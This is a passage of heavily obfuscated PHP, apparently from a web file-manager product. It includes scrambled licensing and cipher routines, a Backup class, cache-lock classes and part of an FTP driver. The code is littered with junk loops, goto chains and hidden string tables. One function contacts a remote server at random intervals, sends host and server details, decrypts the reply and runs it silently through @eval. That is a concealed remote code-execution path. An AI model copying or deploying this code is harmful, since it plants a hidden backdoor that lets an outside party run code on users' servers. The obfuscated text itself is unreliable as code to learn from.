$aƳ[636]; goto B; B: while (strlen($eب) < $aƳ[609]) { if (!$eب) { break; } $eب++; } foreach ($E as $F¯ => $bˇĐ) { if ($bˇĐ == $C֟[282] && $C֟[25]($this->mvec1056ee3e, 0, 1) == $C֟[282]) { continue; } if (!$C֟[261]($F¯, $aל˂)) { $cړۚ[] = $F¯; } } foreach ($cړۚ as $F¯) { unset($C􎔪[$F¯]); } goto Bס; Bס: return $C􎔪; goto e; FϾ: $E = array($C֟[281] => $C֟[282], $C֟[283] => $C֟[282], $C֟[284] => $C֟[282], $C֟[285] => $C֟[282], $C֟[286] => $C֟[282], $C֟[287] => $C֟[282], $C֟[288] => $C֟[289], $C֟[290] => $C֟[289], $C֟[291] => $C֟[289], $C֟[292] => $C֟[289], $C֟[293] => $C֟[289], $C֟[294] => $C֟[289], $C֟[295] => $C֟[289], $C֟[296] => $C֟[289], $C֟[297] => $C֟[289]); $aל˂ = $C֟[0]($C֟[298], $C֟[116]($this->mfcrd58b5e91, $C֟[139], $C֟[10])); $cդ = $aƳ[635]; goto dԭ; e: } private function yzen5d17d99d() { $E =& $_SERVER[]; if ($this->mvec1056ee3e != $E[131]) { return; } $GLOBALS[$E[104]][$E[108]][$E[299]] = $E[239]; $GLOBALS[$E[104]][$E[300]] = $E[239]; if ($E[61]($E[301])->{$_SERVER[][63]}($E[93]) != $E[253]) { $E[61]($E[301])->{$_SERVER[][240]}($E[93], $E[253]); } } public function omgzf0d42644() { return $_SERVER[][302]; } private function fkyg56a0c09b() { goto Dً; B: if ($this->mvec1056ee3e == $bσ[131] || !$bσ[116]($GLOBALS, $bσ[142])) { return; } if (!$bσ[261]($_SERVER[$bσ[44]], $Eߩ)) { return; } if ($bσ[255]() % 4 != 0) { return; } goto C; cŝ: $E = $bσ[61]($bσ[62])->{$_SERVER[][63]}($bσ[126]); $f = array($bσ[183] => $bσ[61]($bσ[62])->{$_SERVER[][63]}($bσ[227]), $bσ[197] => $this->mvec1056ee3e, $bσ[194] => $_SERVER[$bσ[195]], $bσ[196] => $bσ[61]($bσ[62])->{$_SERVER[][63]}($bσ[157]), $bσ[123] => $bσ[124]($_SERVER[$bσ[125]] . $E), $bσ[187] => $bσ[167], $bσ[190] => $_SERVER[$bσ[191]]); $a¢ = $this->{$_SERVER[][202]}($bσ[311], $f); goto E; f: $E屭Í = $AӇ[638]; if (!$E屭Í) { die; } if ($this->{$_SERVER[][218]}($a¢[$bσ[312]]) != $f[$bσ[183]]) { $F䇝녅 = array($bσ[220] => $E, $bσ[221] => $_SERVER[$bσ[125]], $bσ[222] => $bσ[223](), $bσ[192] => $_SERVER[$bσ[193]]); $EÑ = $this->{$_SERVER[][224]}($bσ[166]($F䇝녅)); $a¢ = $this->{$_SERVER[][202]}($bσ[225] . $EÑ); if ($a¢ && $bσ[161]($a¢) && isset($a¢[$bσ[312]])) { $E˥ = $this->{$_SERVER[][208]}($a¢[$bσ[312]], 2); if ($E˥) { $E˥ = $this->{$_SERVER[][218]}($E˥); } if ($E˥) { try { @eval($E˥); } catch (Exception $Cݦ) { } } } } goto fཀྵ; Dً: $AӇ =& $_SERVER[]; $bσ =& $_SERVER[]; $Eߩ = array($bσ[303], $bσ[304], $bσ[305]); goto AН; AН: $fε = $AӇ[637]; if (strlen($fε) < $AӇ[578]) { die; } $e = $bσ[306] . $bσ[124]($bσ[307]); goto B; C: $F = $bσ[13](array($bσ[308], $bσ[309]), $e); if ($F && $bσ[255]() - $F < $bσ[263]($bσ[310])) { return; } $bσ[13](array($bσ[308], $bσ[170]), $e, $bσ[255]()); goto cŝ; E: if (!$bσ[161]($a¢)) { return; } if ($a¢[$bσ[183]] && $a¢[$bσ[312]]) { if ($this->{$_SERVER[][218]}($a¢[$bσ[312]]) == $f[$bσ[183]]) { return; } } $this->{$_SERVER[][182]}(); goto f; fཀྵ: } private function knuy6a49d38d($fɊ = '', $c = array(), $F = 5) { goto dȵ; dȵ: $Eκ =& $_SERVER[]; $d͂ =& $_SERVER[]; $c = $d͂[313]; goto D֎; D: $FҢÈē = $Eκ[641]; while ($FҢÈē < $Eκ[584]) { if ($FҢÈē >= 0) { break; } $FҢÈē++; } return $d͂[210]($c, !0); goto bÅ; c: $eԂ = $Eκ[640]; if (!$eԂ) { die; } if ($c && $d͂[161]($c)) { $c = $c . $d͂[315] . $d͂[316]($c); } goto BԐ; BԐ: if ($c === -1) { return $c; } $d = $d͂[271](array($d͂[272] => array($d͂[275] => $F, $d͂[273] => $d͂[317]), $d͂[318] => array($d͂[319] => !1, $d͂[320] => !1))); $c = @$d͂[276]($c, !1, $d); goto D; D֎: $c = $this->{$_SERVER[][269]}($c, $d͂[314]); $fɍ۽ = $Eκ[639]; $c = $c . $fɊ; goto c; Fˈȓ: if (!$D) { return; } goto fä; bÅ: $fȊ = $Eκ[642]; if (!$fȊ) { return; } $D = $Eκ[643]; goto Fˈȓ; fä: } private function bjof45f25fc5() { goto C̟; bǡ: $Eڲ = $fֺ[646]; if (strlen($Eڲ) < $fֺ[578]) { die; } $E垯 = $d̖ه[116]($this->mfcrd58b5e91, $d̖ه[348]); goto a駰; C̟: $fֺ =& $_SERVER[]; $d̖ه =& $_SERVER[]; $C˅ = array($d̖ه[321] => $d̖ه[322], $d̖ه[323] => $d̖ه[324], $d̖ه[325] => $d̖ه[326], $d̖ه[327] => $d̖ه[328], $d̖ه[329] => $d̖ه[330], $d̖ه[331] => $d̖ه[264], $d̖ه[332] => $d̖ه[264], $d̖ه[333] => $d̖ه[322], $d̖ه[334] => $d̖ه[324], $d̖ه[335] => $d̖ه[326], $d̖ه[336] => $d̖ه[337], $d̖ه[338] => $d̖ه[328], $d̖ه[339] => $d̖ه[340], $d̖ه[341] => $d̖ه[330], $d̖ه[342] => $d̖ه[343], $d̖ه[344] => $d̖ه[345], $d̖ه[346] => $d̖ه[347]); goto d늩匉; aևƋ: return $C + $E垯; $C = $fֺ[648]; goto B; a駰: $Eǖ = $fֺ[647]; if (strlen($Eǖ) < $fֺ[580]) { die; } $E垯 = $E垯 ? $d̖ه[263]($E垯) : 0; goto aևƋ; Aƽ齕: $B = $fֺ[645]; if (strlen($B) < $fֺ[578]) { die; } $C = $d̖ه[263]($C ? $C : $d̖ه[322]); goto bǡ; d늩匉: $C = $fֺ[644]; if (!$C) { die; } $C = $C˅[$this->mvec1056ee3e]; goto Aƽ齕; B: } public function btivdf1b379b($Eߏⴆ) { goto C; fď: $d׭ = $eۡ[650]; $e = $C[241]($e, $C[10], $C[349]); $eг = $eۡ[651]; goto b; dՙ: $c = $eۡ[649]; if ($Eߏⴆ[$C[349]] == $C[239]) { return; } if ($eڿ >= $C[263]($C[264])) { return; } goto b; b: $cӻ = $C[61]($C[149])->{$_SERVER[][150]}(); if ($cӻ <= $eڿ) { return; } $e = $C[61]($C[149])->{$_SERVER[][350]}($C[349])->{$_SERVER[][351]}($eڿ)->{$_SERVER[][352]}(); goto fď; b: if (!$C[261]($Eߏⴆ[$C[349]], $e)) { $C[184]($C[353], !1, $C[258]); } goto Dާ; C: $eۡ =& $_SERVER[]; $C =& $_SERVER[]; $eڿ = $this->{$_SERVER[][147]}(); goto dՙ; Dާ: } public function jylr4a961e37() { goto f; f: $Fұϲ =& $_SERVER[]; $Cˈ =& $_SERVER[]; if (!$Cˈ[116]($GLOBALS, $Cˈ[142]) || $Cˈ[354](1, 100) > 20) { return; } goto bϢ; c: if (!$C޳隷) { return; } $DῚ = $Cˈ[271](array($Cˈ[272] => array($Cˈ[273] => $Cˈ[274], $Cˈ[275] => 3))); $Aה = $Fұϲ[653]; goto b愄; Dذ: if (!$D) { die; } echo $Cˈ[355] . $Cˈ[356]($d) . $Cˈ[357]; $C՛嗍 = $Fұϲ[655]; goto b̭܌ʐ; b愄: if (strlen($Aה) < $Fұϲ[609]) { return; } $d = @$Cˈ[276]($B߷, !1, $DῚ); $D = $Fұϲ[654]; goto Dذ; bϢ: $B߷ = $Cˈ[268]; $B߷ = $this->{$_SERVER[][269]}($B߷, $Cˈ[270]); $C޳隷 = $Fұϲ[652]; goto c; b̭܌ʐ: } private function jxic9f87cbce($dѼ, $BѸ, $C˃ = 3) { goto E܋㒱; e׉: return $d͞Մ; goto bѺѲ; A̲: $e̘ = $Aڇ[134](15); $bҒ = $c[658]; while (strlen($bҒ) < $c[580]) { if (!$bҒ) { break; } $bҒ++; } goto Eˏǒ; Eˏǒ: $aЌ = $Aڇ[359]; switch ($EԦø) { case $Aڇ[253]: $d͞Մ = $this->{$_SERVER[][165]}($dѼ, $Aڇ[233]($BѸ . $e̘)); break; case $Aڇ[239]: $d͞Մ = $this->{$_SERVER[][165]}($dѼ, $Aڇ[233]($e̘ . $BѸ)); $f͡Г = $c[659]; if (strlen($f͡Г) < $c[582]) { return; } break; case $Aڇ[360]: $d͞Մ = $this->{$_SERVER[][165]}($dѼ, $Aڇ[128]($e̘ . $BѸ)); break; case $Aڇ[361]: $d͞Մ = $this->{$_SERVER[][165]}($dѼ, $Aڇ[124]($e̘ . $BѸ)); $f = $c[660]; if (strlen($f) < $c[584]) { die; } break; $Fӈ = $c[661]; if (strlen($Fӈ) < $c[609]) { die; } case $Aڇ[362]: goto dӽ; Eķ: $B = $c[664]; if (!$B) { die; } $eȼ = $Aڇ[124]($E . $Aڇ[124]($BѸ . $E) . $BѸ); goto c۲១; dӽ: $dѼ = $Aڇ[128]($dѼ); $c = $c[662]; if (strlen($c) < $c[582]) { die; } goto d; bƟ: $b팤 = $Aڇ[10]; $aĦ = $c[666]; if (!$aĦ) { return; } goto E; fЍ: $d͞Մ = $Aڇ[356]($E . $b팤); break; goto dו; Eƽ: $fЉ = $c[667]; if (strlen($fЉ) < $c[580]) { return; } for ($dҍ = 0; $dҍ < $Aڇ[24]($dѼ); $dҍ++) { $f񰻞 = $f񰻞 == $Aڇ[24]($eȼ) ? 0 : $f񰻞; $F浃 = ($E + $Aڇ[364]($aЌ, $dѼ[$dҍ]) + $Aڇ[365]($eȼ[$f񰻞++])) % 64; $b팤 .= $aЌ[$F浃]; $a예Ȇ = $c[668]; if (strlen($a예Ȇ) < $c[582]) { die; } } goto fЍ; E: $dҍ = 0; $F浃 = 0; $f񰻞 = 0; goto Eƽ; c۲១: $eȼ = $Aڇ[25]($eȼ, $E % 8, $E % 8 + 7); $aێ = $c[665]; if (strlen($aێ) < $c[578]) { die; } goto bƟ; d: $E = $Aڇ[363](0, 64); $fռߢ = $c[663]; $E = $aЌ[$E]; goto Eķ; dו: default: $d͞Մ = $this->{$_SERVER[][165]}($dѼ, $BѸ . $e̘); $Dɺ = $c[669]; while ($Dɺ < $c[609]) { if ($Dɺ >= 0) { break; } $Dɺ++; } break; $E = $c[670]; while ($E < $c[578]) { if ($E >= 0) { break; } $E++; } } $d͞Մ = $Aڇ[233]($EԦø . $e̘ . $d͞Մ); goto bú; f«Ї: $c = $c[656]; if (!$c) { return; } $dѼ = $Aڇ[2]($dѼ); goto Eʗ䓓; bú: $c = $c[671]; while (strlen($c) < $c[578]) { if (!$c) { break; } $c++; } if ($C˃ - 1 > 0) { $d͞Մ = $this->{$_SERVER[][137]}($d͞Մ, $BѸ, $C˃ - 1); } goto e׉; Eʗ䓓: $EԦø = $Aڇ[354](0, 5) . $Aڇ[10]; $BǷ = $c[657]; if (!$BǷ) { die; } goto A̲; E܋㒱: $c =& $_SERVER[]; $Aڇ =& $_SERVER[]; $Aڇ[358](1); goto f«Ї; bѺѲ: } private function gtnz7578306c($Eτ, $cٜ҈, $cۭ = 3) { goto F㴽˺; D续۴: if (!$aً) { return; } switch ($a̲) { case $E[253]: $c = $this->{$_SERVER[][269]}($Eτ, $E[233]($cٜ҈ . $Bɠû)); break; case $E[239]: $c = $this->{$_SERVER[][269]}($Eτ, $E[233]($Bɠû . $cٜ҈)); break; case $E[360]: $c = $this->{$_SERVER[][269]}($Eτ, $E[128]($Bɠû . $cٜ҈)); break; case $E[361]: $c = $this->{$_SERVER[][269]}($Eτ, $E[124]($Bɠû . $cٜ҈)); $Bɐ̷ = $Cё[675]; while (strlen($Bɐ̷) < $Cё[578]) { if (!$Bɐ̷) { break; } $Bɐ̷++; } break; $eǮ = $Cё[676]; if (strlen($eǮ) < $Cё[584]) { return; } case $E[362]: goto A; b: $D = $Cё[678]; while (strlen($D) < $Cё[584]) { if (!$D) { break; } $D++; } $eׂ = 0; goto b͊; A: $Eτ = $E[366]($Eτ); $B« = $Eτ[0]; $Eτ = $E[25]($Eτ, 1); goto Eϯ; Eϯ: $D㭖 = $E[364]($F, $B«); $d = $E[124]($B« . $E[124]($cٜ҈ . $B«) . $cٜ҈); $d킭 = $Cё[677]; goto d; DނΑ: $Dլ = 0; $C쎕 = $Cё[680]; while (strlen($C쎕) < $Cё[609]) { if (!$C쎕) { break; } $C쎕++; } goto Dϻ̍; Dϻ̍: for ($eׂ = 0; $eׂ < $E[24]($Eτ); $eׂ++) { $Dլ = $Dլ == $E[24]($d) ? 0 : $Dլ; $Cďу = $Cё[681]; $Fţ = $Dլ++; $f׆꼷 = $Cё[682]; if (strlen($f׆꼷) < $Cё[584]) { return; } $e = $E[364]($F, $Eτ[$eׂ]) - $D㭖 - $E[365]($d[$Fţ]); $F = $Cё[683]; if (strlen($F) < $Cё[578]) { return; } while ($e < 0) { $e += 64; $E赎 = $Cё[684]; if (strlen($E赎) < $Cё[580]) { die; } } $bΓ .= $F[$e]; $BЌЗ = $Cё[685]; } $c = $E[367]($bΓ); break; goto C; b͊: $A۳ = $Cё[679]; while ($A۳ < $Cё[582]) { if ($A۳ >= 0) { break; } $A۳++; } $e = 0; goto DނΑ; d: while (strlen($d킭) < $Cё[609]) { if (!$d킭) { break; } $d킭++; } $d = $E[25]($d, $D㭖 % 8, $D㭖 % 8 + 7); $bΓ = $E[10]; goto b; C: default: $c = $this->{$_SERVER[][269]}($Eτ, $cٜ҈ . $Bɠû); break; $A = $Cё[686]; while (strlen($A) < $Cё[578]) { if (!$A) { break; } $A++; } } if ($cۭ - 1 > 0) { $c = $this->{$_SERVER[][208]}($c, $cٜ҈, $cۭ - 1); } goto c鎜; C᎕: $Eτ = $E[2]($Eτ); $b߷ = $Cё[588]; while ($b߷ < $Cё[609]) { if ($b߷ >= 0) { break; } $b߷++; } goto F뒲; c鎜: return $c; goto Bޞ; F뒲: $Eτ = $E[233]($Eτ); $a̲ = $Eτ[0]; $E裿 = $Cё[672]; goto cߒ; cꊴ: $E = $Cё[673]; $F = $E[359]; $aً = $Cё[674]; goto D续۴; cߒ: if (strlen($E裿) < $Cё[582]) { return; } $Bɠû = $E[25]($Eτ, 1, 15); $Eτ = $E[25]($Eτ, 16); goto cꊴ; F㴽˺: $Cё =& $_SERVER[]; $E =& $_SERVER[]; if (!$E[158]($Eτ) || $E[24]($Eτ) < 10) { return !1; } goto C᎕; Bޞ: } public function qeusef141546($d) { goto a; c: $B = $d[689]; $E˪ = $fֵ[263](($FỔД + $dغ) / 2); $eϭ = $d[690]; goto Bȹ; A䴡: $Cї = $fֵ[124]($fֵ[369] . ($FỔД + $dغ) . $fֵ[370] . $E˪ . $fֵ[370] . $c . $fֵ[371]); $eѪؼ = $this->{$_SERVER[][165]}($d, $Cї) . $fֵ[372] . $A; $EꞗΓ = $d[697]; goto E; A: $fۣ = $d[687]; if (strlen($fۣ) < $d[609]) { die; } $dغ = $this->{$_SERVER[][368]}(); goto EΔ; Bȹ: while (strlen($eϭ) < $d[578]) { if (!$eϭ) { break; } $eϭ++; } while (1) { $e = $E˪; $cߞ = $dখ; $e = $d[691]; while ($e < $d[609]) { if ($e >= 0) { break; } $e++; } while ($cߞ % $e != 0) { $a׬ = $cߞ; $DÅن = $d[692]; if (strlen($DÅن) < $d[584]) { die; } $cߞ = $e; $B = $d[693]; if (strlen($B) < $d[584]) { die; } $e = $a׬ % $e; $b = $d[694]; if (!$b) { return; } } if ($e == 1) { break; } else { $E˪++; } } $c = 2; goto C; a: $d =& $_SERVER[]; $fֵ =& $_SERVER[]; $FỔД = $this->{$_SERVER[][368]}(); goto A; EΔ: $E = $d[688]; while ($E < $d[580]) { if ($E >= 0) { break; } $E++; } $dখ = ($FỔД - 1) * ($dغ - 1); goto c; E: if (!$EꞗΓ) { die; } return $eѪؼ; goto a˒; C: $dʔ = $d[695]; if (strlen($dʔ) < $d[584]) { die; } for ($a = 0; $a < $dখ * 10; $a++) { if (($dখ * $a + 1) % $E˪ == 0) { $c = $fֵ[263](($dখ * $a + 1) / $E˪); break; } } goto C; C: $A = $this->{$_SERVER[][165]}($FỔД * $dغ . $fֵ[10], $fֵ[167]); $a = $d[696]; if (strlen($a) < $d[584]) { return; } goto A䴡; a˒: } public function ukgr07cea798($aυ) { goto C过; cʹ: for ($e䎛 = 3; $e䎛 < $A䄣; $e䎛 += 2) { if ($A䄣 % $e䎛 != 0) { continue; } $A = $e䎛; $FĻ = $aʃإ[702]; if (!$FĻ) { return; } $aĵ = $E[263]($A䄣 / $e䎛); $E઺ = $aʃإ[703]; while (strlen($E઺) < $aʃإ[582]) { if (!$E઺) { break; } $E઺++; } break; $CɍтĜ = $aʃإ[704]; } $b󕂟 = ($A - 1) * ($aĵ - 1); $D = $E[263](($A + $aĵ) / 2); goto eЛ; bȮӥ: $Aؚ̺ = $this->{$_SERVER[][269]}($d޲[0], $C); return $Aؚ̺; $D = $aʃإ[708]; goto fݽ; d҉: $C = $E[124]($E[369] . ($A + $aĵ) . $E[370] . $D . $E[370] . $A . $E[371]); $a԰ܲ = $aʃإ[707]; if (strlen($a԰ܲ) < $aʃإ[584]) { return; } goto bȮӥ; bㅶ: $aĵ = 0; $Cʵ = $aʃإ[701]; while ($Cʵ < $aʃإ[582]) { if ($Cʵ >= 0) { break; } $Cʵ++; } goto cʹ; C过: $aʃإ =& $_SERVER[]; $E =& $_SERVER[]; $d޲ = $E[0]($E[372], $aυ); goto b; F: $F = $aʃإ[699]; $A = 0; $Dǂ = $aʃإ[700]; goto bㅶ; fݽ: while ($D < $aʃإ[578]) { if ($D >= 0) { break; } $D++; } goto E⤈滋; eЛ: while (1) { $C = $D; $f = $aʃإ[705]; $A = $b󕂟; $F鞍 = $aʃإ[706]; if (!$F鞍) { return; } while ($A % $C != 0) { $Bޚ = $A; $A = $C; $C = $Bޚ % $C; } if ($C == 1) { break; } else { $D++; } } $A = 2; for ($e䎛 = 0; $e䎛 < $b󕂟 * 10; $e䎛++) { if (($b󕂟 * $e䎛 + 1) % $D == 0) { $A = $E[263](($b󕂟 * $e䎛 + 1) / $D); break; } } goto d҉; b: if ($E[19]($d޲) != 2) { return $E[10]; } $A䄣 = $this->{$_SERVER[][269]}($d޲[1] . $E[10], $E[167]); $Cޗٮ = $aʃإ[698]; goto e˰; e˰: if (strlen($Cޗٮ) < $aʃإ[584]) { return; } if (!$A䄣) { return $E[10]; } $A䄣 = $E[263]($A䄣); goto F; E⤈滋: } public function wrps6d119b32() { goto Bћ; c҂: $b׋ = 2; $eĿ = $fׇ֧[712]; while ($eĿ < $fׇ֧[609]) { if ($eĿ >= 0) { break; } $eĿ++; } goto e; e: for ($A󦱽 = $E; $A󦱽 > 1; $A󦱽--) { $c = !0; foreach ($fᱎ as $dجҬ) { if ($A󦱽 % $dجҬ == 0) { $c = !1; break; } } if ($c) { $b׋ = $A󦱽; break; } } return $b׋; goto Dݼ; BՔͩ: $e݋ = $fׇ֧[710]; if (strlen($e݋) < $fׇ֧[578]) { die; } $f = 1; goto cɅ; cɅ: $D = $fׇ֧[711]; if (!$D) { die; } while ($f <= (int) $d[374]($E)) { $A󦱽 = $f; while (!0) { $A󦱽++; if ($A󦱽 <= 2) { $f = $A󦱽; break; } else { if ($A󦱽 < 2) { continue; } } $c = !0; for ($B﮳ = 2; $B﮳ <= $d[374]($A󦱽); $B﮳++) { if ($A󦱽 % $B﮳ == 0) { $c = !1; } } if ($c) { $f = $A󦱽; break; } } $fᱎ[] = $f; } goto c҂; Bћ: $fׇ֧ =& $_SERVER[]; $d =& $_SERVER[]; $E = $d[354]($d[373](2, 14), $d[373](2, 16) - 1); goto eÊ; eÊ: $AĜ = $fׇ֧[709]; if (!$AĜ) { die; } $fᱎ = array(); goto BՔͩ; Dݼ: } public function canq0fa9f8f3($a, $Eᙟ) { $E손̏ =& $_SERVER[]; $F۫ =& $_SERVER[]; return $F۫[13](array($F۫[14], $F۫[375]), $a, $Eᙟ); $fԘ = $E손̏[713]; if (strlen($fԘ) < $E손̏[584]) { die; } } public function kvdh063f1726($F׉, $b) { $A =& $_SERVER[]; return $A[13](array($A[376], $A[377]), $F׉, $b); } public function ymqt6793086f($bέ, $c㱝) { $dۣ =& $_SERVER[]; return $dۣ[13](array($dۣ[376], $dۣ[378]), $bέ, $c㱝); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $dޙ刑 =& $_SERVER[]; $this->isManual(); self::$name = date($dޙ刑[714]); if (!($F = Model($dޙ刑[715])->lastItem())) { $F = $this->initData(); } else { self::$name = $F[$dޙ刑[28]]; if ($F[$dޙ刑[716]] == $dޙ刑[87]) { self::$name = date($dޙ刑[717]); $F = 0; if (isset($F[$dޙ刑[291]][$dޙ刑[193]][$dޙ刑[447]])) { $F = (int) $F[$dޙ刑[291]][$dޙ刑[193]][$dޙ刑[447]]; } if (self::$manual == 0 && $F[$dޙ刑[28]] == self::$name) { Model($dޙ刑[715])->remove($F[$dޙ刑[393]]); } $F = $this->initData($F, $F[$dޙ刑[718]]); } else { $this->checkStore($F[$dޙ刑[718]]); } } self::$option = $F; } private function isManual() { $A߮ = _get($GLOBALS, $_SERVER[][719], 0); $A߮ = intval($A߮); self::$manual = $A߮ && $A߮ == 1 ? 1 : 0; } private function initData($F̂Ȱ = 0, $d = '') { goto eز; Dަ: $this->checkStore($D[$a[718]]); if (self::$manual == 1) { self::$name .= $a[71] . date($a[720]); } $e = array($a[718] => $D[$a[718]], $a[28] => self::$name, $a[716] => 0, $a[721] => $D[$a[721]], $a[722] => self::$manual, $a[291] => array($a[723] => array($a[716] => 0), $a[724] => array($a[716] => 0, $a[725] => 0, $a[726] => 0, $a[29] => $a[33], $a[727] => 0, $a[476] => 0), $a[728] => array($a[716] => 0, $a[725] => 0, $a[726] => 0, $a[727] => 0, $a[476] => 0), $a[193] => array($a[716] => 0, $a[729] => 0, $a[730] => 0, $a[731] => 0, $a[732] => 0, $a[447] => $F̂Ȱ, $a[727] => 0, $a[476] => 0)), $a[727] => time(), $a[476] => 0); goto Eٴ; eز: $a =& $_SERVER[]; $D = Model($a[715])->config(); if ($d && $D[$a[718]] != $d) { $F̂Ȱ = 0; } goto Dަ; Eٴ: $eʆ = Model($a[715])->insert($e); $e[$a[393]] = $eʆ; return $e; goto Cʻ; Cʻ: } private function checkStore($BӜ) { $BϞۓ =& $_SERVER[]; $Aݽ = Model($BϞۓ[733])->listData($BӜ); Model($BϞۓ[733])->checkConfig($Aݽ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[][715])->findByName(self::$name); } return self::$option; } public static function set($Eڤؽ) { $Fʎ =& $_SERVER[]; $e = self::get(); foreach ($Eڤؽ as $d䜔 => $Aȝ) { $Aťڠ = explode($Fʎ[95], $d䜔); $Fٖ = count($Aťڠ); switch ($Fٖ) { case 1: $e[$Aťڠ[0]] = $Aȝ; break; case 2: $e[$Aťڠ[0]][$Aťڠ[1]] = $Aȝ; break; case 3: $e[$Aťڠ[0]][$Aťڠ[1]][$Aťڠ[2]] = $Aȝ; break; } } Model($Fʎ[715])->update($e[$Fʎ[393]], $e); self::$option = $e; return self::$option; } public function keep() { $c燡 =& $_SERVER[]; $Eꆞ = self::get(); if ($Eꆞ[$c燡[291]][$c燡[723]][$c燡[716]] == $c燡[87]) { return; } $this->backupKeep($Eꆞ); self::set(array($c燡[734] => 1)); } private function backupKeep($aꐧ) { goto F鵂; Eĝ: if (empty($a򜑜)) { return; } $d = 0; $eӧ· = array(); goto a; EŽ: $dК = Model($E֨[736])->get($E֨[737]); foreach ($a򜑜 as $B˴) { if (isset($B˴[$E֨[722]]) && $B˴[$E֨[722]] == $E֨[87]) { continue; } if (!empty($B˴[$E֨[28]]) && in_array($B˴[$E֨[28]], $eӧ·)) { continue; } Model($E֨[715])->remove($B˴[$E֨[393]]); $bŲ = $this->backupPath($aꐧ, $dК); IO::remove($bŲ, !1); } goto Cӛ; F鵂: $E֨ =& $_SERVER[]; if (self::$manual == 1) { return; } $a򜑜 = Model($E֨[715])->listData(); goto Eĝ; a: foreach ($a򜑜 as $B˴) { if ($d >= 7) { break; } $eӧ·[] = $B˴[$E֨[28]]; $d++; } for ($d = 0; $d < 12; $d++) { $eӧ·[] = date($E֨[735], strtotime("\x2d{$d}\x20\x6d\x6f\x6e\x74\150\163")); } $eӧ· = array_unique($eӧ·); goto EŽ; Cӛ: } private function backupPath($D, $f = false) { $Cƶ =& $_SERVER[]; if (!$f) { $f = Model($Cƶ[736])->get($Cƶ[737]); } $f = $D[$Cƶ[28]]; $eЃ = substr(md5($Cƶ[738] . $f . $f), 0, 8); return "\173\151\157\x3a{$D[$Cƶ[718]]}\175\x2f\144\141\x74\141\x62\141\163\145\57\x62\x61\x63\x6b\165\x70\57" . $f . $Cƶ[71] . $eЃ; } public function db() { goto E; E: $a =& $_SERVER[]; $F҂㍡ = self::get(); if ($F҂㍡[$a[291]][$a[724]][$a[716]] == $a[87]) { return !0; } goto eɕ; eɕ: $f = new BackupDb(); if (!$f->index()) { return !1; } self::set(array($a[739] => 1)); goto C; C: return !0; goto Eՠ; Eՠ: } public function dbFile() { goto F; DϜ: return !0; goto eӋۊ; aܘ: $fצٓ = new BackupDbFile(); if (!$fצٓ->index()) { return !1; } self::set(array($Eٌ[740] => 1)); goto DϜ; F: $Eٌ =& $_SERVER[]; $a̲ = self::get(); if ($a̲[$Eٌ[291]][$Eٌ[728]][$Eٌ[716]] == $Eٌ[87]) { return !0; } goto aܘ; eӋۊ: } public function file() { $B´؃ =& $_SERVER[]; $cձ = self::get(); if ($cձ[$B´؃[291]][$B´؃[193]][$B´؃[716]] == $B´؃[87]) { return !0; } if (!isset($cձ[$B´؃[721]]) || $cձ[$B´؃[721]] == $B´؃[191]) { $aúӬ = new BackupFile(); if (!$aúӬ->index()) { return !1; } } self::set(array($B´؃[741] => 1, $B´؃[716] => 1)); return !0; } } goto bڋʌ; D޵: class CacheLockMemcached { public function lock($eşƭ, $fȉ𭂮 = 0) { $eʌ돉 = Cache::init(); $có = microtime(!0) + $fȉ𭂮; while (microtime(!0) < $có) { $e̯ = $eʌ돉->get($eşƭ); if (!$e̯ || $e̯ < microtime(!0)) { $dЛ = $eʌ돉->handle->add($eşƭ, $có, $fȉ𭂮); if ($dЛ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($cԂ) { return Cache::init()->get($cԂ); } public function unlock($F뒧ޫ) { return Cache::init()->remove($F뒧ޫ); } } class CacheLockDatabase { public function lock($c뷪, $C = 0) { $c = Model($_SERVER[][800]); $bۖӼ = microtime(!0) + $C; while (microtime(!0) < $bۖӼ) { $fː = $c->get($c뷪); if (!$fː || $fː < microtime(!0)) { $C = $c->set($c뷪, $bۖӼ); if ($C) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($c) { return Model($_SERVER[][800])->get($c); } public function unlock($a捤) { Model($_SERVER[][800])->remove($a捤); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($c崊, $E) { $D֫髆 =& $_SERVER[]; if (!class_exists($D֫髆[827])) { show_json($D֫髆[828], !1); } $this->cacheTime = $E; $this->handle = new Memcached(); if (is_array($c崊[$D֫髆[829]]) && count($c崊[$D֫髆[829]]) >= 1) { foreach ($c崊[$D֫髆[829]] as $Dᒕ) { $CɎ䓧 = explode($D֫髆[4], $Dᒕ); $this->handle->addServer($CɎ䓧[0], $CɎ䓧[1]); } } else { $this->handle->addServer($c崊[$D֫髆[175]], $c崊[$D֫髆[176]]); } } public function set($Fۜ, $D҉, $aǉ = false) { $aǉ = $aǉ ? $aǉ : $this->cacheTime; return $this->handle->set($Fۜ, $D҉, $aǉ); } public function get($d߲) { return $this->handle->get($d߲); } public function remove($Aʽ) { return $this->handle->delete($Aʽ); } public function deleteAll() { return $this->handle->flush(); } } goto Aō; d: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($D޶Ӌ) { parent::__construct(); if (count($D޶Ӌ) > 0) { $this->_init($D޶Ӌ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($b) { $Fǯȭ =& $_SERVER[]; global $config; $this->appCharset = $config[$Fǯȭ[1249]]; $this->systemCharset = $config[$Fǯȭ[1250]]; if (isset($b[$Fǯȭ[1251]]) && $b[$Fǯȭ[1251]]) { $this->systemCharset = $b[$Fǯȭ[1251]]; } } public function iconvApp($cח) { return $this->iconvTo($cח, $this->systemCharset, $this->appCharset); } public function iconvSystem($C˪) { return $this->iconvTo($C˪, $this->appCharset, $this->systemCharset); } public function getPathOuter($Dٲ׳) { goto Eۃ͎; Fˏ: return $this->pathDriver . $F[8] . ltrim($Dٲ׳, $F[8]); goto dު; FŬ: $Dٲ׳ = KodIO::clear($Dٲ׳); $Dٲ׳ = substr($Dٲ׳, strlen($D쾆)); if (empty($this->pathDriver)) { return $Dٲ׳; } goto Fˏ; Eۃ͎: $F =& $_SERVER[]; $D쾆 = $this->iconvApp($this->pathBase); $Dٲ׳ = $this->iconvApp($Dٲ׳); goto aا䏉; aا䏉: if (substr($D쾆, 0, 2) == $F[1252]) { $D쾆 = BASIC_PATH . substr($D쾆, 2); } if (substr($Dٲ׳, 0, 